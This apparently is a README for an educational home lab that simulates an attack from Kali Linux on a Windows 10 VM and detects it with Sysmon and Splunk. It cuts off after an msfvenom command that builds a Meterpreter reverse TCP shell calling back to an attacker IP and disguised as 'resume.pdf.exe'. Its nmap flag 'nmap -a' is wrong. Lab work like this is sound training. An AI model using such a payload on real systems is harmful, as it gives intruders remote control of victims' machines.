# Home Lab: Malware Analysis & Telemetry Generation with Splunk

## 📝 Project Overview
This project involves building a virtualized home lab environment to simulate a cyber attack and analyze the resulting telemetry. The goal was to generate malicious traffic using a custom payload, execute it on a target Windows machine, and detect the activity using **Splunk** and **Sysmon**.

**⚠️ Disclaimer:** *This project was conducted in a safe, isolated virtual environment for educational purposes only.*

## 🛠️ Tools & Technologies Used
- **Oracle VirtualBox**: For virtualization.
- **Kali Linux**: Attacker machine.
- **Windows 10**: Victim machine.
- **Splunk Enterprise**: SIEM for log ingestion and analysis.
- **Sysmon**: Advanced system monitoring for Windows.
- **Metasploit (MSF Venom)**: For payload generation.
- **Nmap**: For network scanning.

## 🏗️ Architecture
* **Attacker:** Kali Linux (running Metasploit Handler & Python HTTP Server)
* **Target:** Windows 10 (Forwarding Sysmon logs to Splunk)
* **Monitor:** Splunk Indexer

## 🚀 Implementation Steps

### 1. Environment Setup
- Configured a virtual network to allow communication between Kali and Windows.
- Installed **Sysmon** on the Windows target to capture detailed event logs.
- Configured Splunk to ingest Sysmon logs via `inputs.conf`.

### 2. The Attack Phase
- **Reconnaissance:** Performed an Nmap scan (`nmap -a`) to identify open ports (Found Port 3389 RDP open).
- **Weaponization:** Generated a reverse TCP shell payload using `msfvenom`:
  ```bash
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=4444 -f exe -o resume.pdf.exe
